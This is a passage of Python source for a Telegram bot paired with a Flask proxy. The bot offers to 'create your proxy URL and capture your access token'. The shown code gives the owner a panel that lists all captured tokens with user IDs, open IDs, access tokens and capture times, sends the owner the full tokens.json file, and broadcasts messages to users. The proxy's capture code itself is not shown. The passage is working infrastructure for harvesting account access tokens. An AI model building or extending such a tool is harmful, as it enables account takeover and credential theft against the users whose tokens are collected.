    f"<i>ᴛʜɪs ʙᴏᴛ ɪs ᴅᴇsɪɢɴᴇᴅ ᴛᴏ ʜᴇʟᴘ ʏᴏᴜ ᴄʀᴇᴀᴛᴇ ʏᴏᴜʀ ᴘʀᴏxʏ ᴜʀʟ ᴀɴᴅ "
    f"ᴄᴀᴘᴛᴜʀᴇ ʏᴏᴜʀ ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ ᴇᴀsɪʟʏ. "
    f"ꜰᴏʀ ᴜᴘᴅᴀᴛᴇs, sᴜᴘᴘᴏʀᴛ, ᴏʀ ᴀssɪsᴛᴀɴᴄᴇ, ꜰᴏʟʟᴏᴡ ᴛʜᴇ ᴏꜰꜰɪᴄɪᴀʟ ᴄʜᴀɴɴᴇʟ ᴏʀ ᴄᴏɴᴛᴀᴄᴛ ᴛʜᴇ ᴅᴇᴠᴇʟᴏᴘᴇʀ.</i>\n\n"
    f"❤️ <i>ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴜsɪɴɢ ᴏᴜʀ ʙᴏᴛ!</i>"
        )
    
    elif text == "🛠️ ʙᴏᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ" and user_id == OWNER_ID:
        await show_owner_panel(update, context)

# ================== OWNER PANEL ==================
async def show_owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_users = db_get_total_users()
    total_tokens = db_get_total_tokens()
    
    panel_text = (
        f"<b>👑 Owner Control Panel</b>\n\n"
        f"<b>📊 Statistics:</b>\n"
        f"👥 Total Users: <b>{total_users}</b>\n"
        f"🎫 Total Tokens: <b>{total_tokens}</b>\n\n"
        f"<b>🔧 Select an option below:</b>"
    )
    
    # Owner inline keyboard
    keyboard = [
        [InlineKeyboardButton("ᴀʟʟ ᴜsᴇʀs", callback_data="owner_users")],
        [InlineKeyboardButton("ᴀʟʟ ᴛᴏᴋᴇɴs", callback_data="owner_tokens")],
        [InlineKeyboardButton("ᴅᴏᴡɴʟᴏᴀᴅ ᴛᴏᴋᴇɴs", callback_data="owner_dl_tokens")],
        [InlineKeyboardButton("ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇssᴀɢᴇ", callback_data="owner_broadcast")],
        [InlineKeyboardButton("🔙 ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="owner_back")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_html(panel_text, reply_markup=reply_markup)

async def owner_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if user_id != OWNER_ID:
        await query.edit_message_text("❌ Unauthorized access.")
        return
    
    data = query.data
    
    if data == "owner_users":
        users = db_get_all_users()
        if not users:
            await query.edit_message_text("No users found.")
            return
        
        text = f"<b>ᴀʟʟ ᴜsᴇʀs ({len(users)})</b>\n\n"
        for u in users:
            status = "🚫" if u[6] == 1 else "✅"
            blocked = "🔒" if u[5] == 1 else ""
            text += f"{status}{blocked} <code>{u[0]}</code> | {u[1] or 'N/A'} | {u[4]}\n"
        
        # Add back button
        keyboard = [[InlineKeyboardButton("🔙 Back to Panel", callback_data="owner_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4000:
            await query.message.reply_html(text, reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=reply_markup)
    
    elif data == "owner_tokens":
        tokens = db_get_all_tokens()
        if not tokens:
            await query.edit_message_text("No tokens captured yet.")
            return
        
        text = f"<b>ᴀʟʟ ᴛᴏᴋᴇɴs ({len(tokens)})</b>\n\n"
        for t in tokens[:10]:
            text += (
f"━━━━━━━━━━━━━━━━━━━━━\n"
f"👤 <b>ᴜsᴇʀ</b> : <code>{t[1]}</code> | <i>{t[5] or 'N/A'}</i>\n"
f"🆔 <b>ᴏᴘᴇɴ ɪᴅ</b> : <code>{t[2]}</code>\n"
f"🔑 <b>ᴀᴄᴄᴇss ᴛᴏᴋᴇɴ</b> :\n<code>{t[3]}</code>\n"
f"🕒 <b>ᴄᴀᴘᴛᴜʀᴇᴅ ᴏɴ</b> : <i>{t[4]}</i>\n"
f"━━━━━━━━━━━━━━━━━━━━━\n"
            )
        
        if len(tokens) > 10:
            text += f"\n... and {len(tokens) - 10} more tokens\n"
        
        text += f"\n📁 All saved in <code>tokens.json</code>"
        
        keyboard = [[InlineKeyboardButton("🔙 Back to Panel", callback_data="owner_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4000:
            await query.message.reply_html(text, reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, parse_mode="HTML", reply_markup=reply_markup)
    
    elif data == "owner_dl_tokens":
        if os.path.exists(TOKEN_JSON_PATH):
            with open(TOKEN_JSON_PATH, "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="tokens.json",
                    caption="📁 All tokens backup file"
                )
        else:
            await query.edit_message_text("No tokens.json found. No tokens captured yet.")
    
    elif data == "owner_broadcast":
        await query.edit_message_text(
    "<b>📢 ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴏᴅᴇ</b>\n\n"
    "<i>ꜱᴇɴᴅ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴛᴏ ᴀʟʟ ᴜꜱᴇʀꜱ.</i>\n\n"
    "📝 <b>ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ʙᴇʟᴏᴡ:</b>\n\n"
    "⚠️ <i>ᴛʏᴘᴇ <code>/cancel</code> ᴛᴏ ᴄᴀɴᴄᴇʟ ᴛʜɪꜱ ᴏᴘᴇʀᴀᴛɪᴏɴ.</i>",
            parse_mode="HTML"
        )
        context.user_data["awaiting_broadcast"] = True
    
    elif data == "owner_back":
        await show_owner_panel_callback(query, context)

async def show_owner_panel_callback(query, context):
    total_users = db_get_total_users()
    total_tokens = db_get_total_tokens()
    
    panel_text = (
f"<b>👑 ᴏᴡɴᴇʀ ᴄᴏɴᴛʀᴏʟ ᴘᴀɴᴇʟ</b>\n\n"
f"📊 <b>ʙᴏᴛ sᴛᴀᴛɪsᴛɪᴄs</b>\n"
f"👥 <b>ᴛᴏᴛᴀʟ ᴜsᴇʀs:</b> <code>{total_users}</code>\n"
f"🎫 <b>ᴛᴏᴛᴀʟ ᴛᴏᴋᴇɴs:</b> <code>{total_tokens}</code>\n\n"
f"🛠️ <b>ᴀᴅᴍɪɴ ᴏᴘᴛɪᴏɴs</b>\n"
f"<i>sᴇʟᴇᴄᴛ ᴀɴʏ ᴏᴘᴛɪᴏɴ ꜰʀᴏᴍ ᴛʜᴇ ᴍᴇɴᴜ ʙᴇʟᴏᴡ ᴛᴏ ᴍᴀɴᴀɢᴇ ᴛʜᴇ ʙᴏᴛ.</i>"
    )
    
    keyboard = [
        [InlineKeyboardButton("ᴀʟʟ ᴜsᴇʀs", callback_data="owner_users")],
        [InlineKeyboardButton("ᴀʟʟ ᴛᴏᴋᴇɴs", callback_data="owner_tokens")],
        [InlineKeyboardButton("ᴅᴏᴡɴʟᴏᴀᴅ ᴛᴏᴋᴇɴs", callback_data="owner_dl_tokens")],
        [InlineKeyboardButton("ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇssᴀɢᴇ", callback_data="owner_broadcast")],
        [InlineKeyboardButton("🔙 ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="owner_back")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(panel_text, parse_mode="HTML", reply_markup=reply_markup)

# ================== BROADCAST HANDLER ==================
async def handle_broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle broadcast message input."""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    
    if not context.user_data.get("awaiting_broadcast"):
        return
    
    text = update.message.text
    if text == "/cancel":
        context.user_data["awaiting_broadcast"] = False
        await update.message.reply_text("❌ Broadcast cancelled.", reply_markup=get_user_keyboard(user_id))
        return
    
    context.user_data["awaiting_broadcast"] = False
    
    users = db_get_all_users()
    sent_count = 0
    failed_count = 0
    
    progress_msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
    
    for u in users:
        uid = u[0]
        if u[6] == 1:  # Skip banned
            continue
        
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"{text}",
                parse_mode="HTML"
            )
            sent_count += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            failed_count += 1
            print(f"Broadcast failed to {uid}: {e}")
    
    db_save_broadcast(text, sent_count)
    
    await progress_msg.edit_text(
        f"<b>✅ Broadcast Complete!</b>\n\n"
        f"📨 Sent: <b>{sent_count}</b>\n"
        f"❌ Failed: <b>{failed_count}</b>\n"
        f"👥 Total users: <b>{len(users)}</b>",
        parse_mode="HTML"
    )
    
    # Restore keyboard
    await update.message.reply_html(
        "<b>✅ Broadcast finished!</b>",
        reply_markup=get_user_keyboard(user_id)
    )

# ================== MESSAGE HANDLER ==================
async def handle_all_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Skip commands
    if update.message and update.message.text and update.message.text.startswith("/"):
        return
    
    # Check if owner is in broadcast mode
    if context.user_data.get("awaiting_broadcast"):
        await handle_broadcast_message(update, context)
        return
    
    # Handle button texts
    if update.message and update.message.text:
        await handle_buttons(update, context)

# ================== RUN BOT ==================
def run_bot():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    application.add_handler(CommandHandler("start", start_command))
    
    # Callback query handler for force join + owner panel
    application.add_handler(CallbackQueryHandler(check_joined_callback, pattern="check_joined"))
    application.add_handler(CallbackQueryHandler(owner_callback_handler, pattern="^owner_"))
    
    # Message handler for buttons & broadcast input
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all_messages))
    
    print("🤖 Telegram Bot Started (Polling)...")
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"📢 Channel: {CHANNEL_USERNAME}")
    print(f"👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ: {DEV_USERNAME}")
    print("✅ Force Join: Enabled")
    print("✅ SQLite Database: Active")
    print(f"✅ Token JSON: {TOKEN_JSON_PATH}")
    application.run_polling()

# ================== START ==================
if __name__ == '__main__':
    # Flask in background thread
    flask_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT, debug=False), daemon=True)
    flask_thread.start()
    
    time.sleep(1.5)
    print(f"🌐 Proxy running on http://{LOCAL_IP}:{PORT}")
    
    # Run Telegram Bot in main thread
    run_bot()